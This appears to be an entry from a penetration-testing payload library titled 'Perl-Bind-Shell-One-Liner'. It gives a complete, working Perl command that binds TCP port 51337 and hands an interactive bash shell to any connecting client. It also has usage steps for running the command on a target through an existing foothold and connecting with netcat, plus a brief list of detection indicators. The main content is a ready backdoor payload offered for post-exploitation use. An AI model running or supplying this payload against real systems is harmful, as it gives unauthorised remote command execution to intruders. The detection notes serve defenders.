---
id: d766cfad-bcb4-4e58-9129-69f123097e39
name: Perl-Bind-Shell-One-Liner
type: code
language: perl
verified: true
created_at: '2023-04-06T03:56:08.747844+00:00'
updated_at: '2023-04-10T20:21:16.649307+00:00'
platforms:
  - Linux
  - Unix
tags:
  - bind-shell
  - payload
  - perl
validated: true
---

# Perl-Bind-Shell-One-Liner

## Code

```perl
perl -e 'use Socket;$p=51337;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));bind(S,sockaddr_in($p, INADDR_ANY));listen(S,SOMAXCONN);for(;$p=accept(C,S);close C){open(STDIN,">&C");open(STDOUT,">&C");open(STDERR,">&C");exec("/bin/bash -i");};'
```

## Description

This Perl one-liner creates a bind shell that listens on TCP port 51337 for incoming connections. Upon connection, it spawns an interactive Bash shell with I/O redirected to the network socket, providing remote command execution capabilities. It is a lightweight payload suitable for Unix-like systems with Perl available, often used in post-exploitation to establish backdoor access without additional binaries.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| $p | Port to bind the listener (hardcoded to 51337; modify in code for custom) | 4444 |

## Usage

Execute the one-liner directly on the target system via an existing access vector (e.g., web shell, SSH). It runs in the foreground; append `&` to background. From the attacker machine, connect using Netcat (`nc target_ip 51337`) to interact with the shell. Ideal for scenarios where Netcat is unavailable but Perl is present.

## Detection

- Monitor for Perl processes with Socket module usage or command-line arguments containing 'use Socket'.
- Network monitoring for new TCP listeners on non-standard ports like 51337.
- Process auditing for unexpected Bash executions tied to network sockets.
- EDR tools flagging one-liner executions or inbound connections from internal IPs.

## Related

- [[procedures/Create-Perl-Bind-Shell]]
- [[tools/Netcat]]
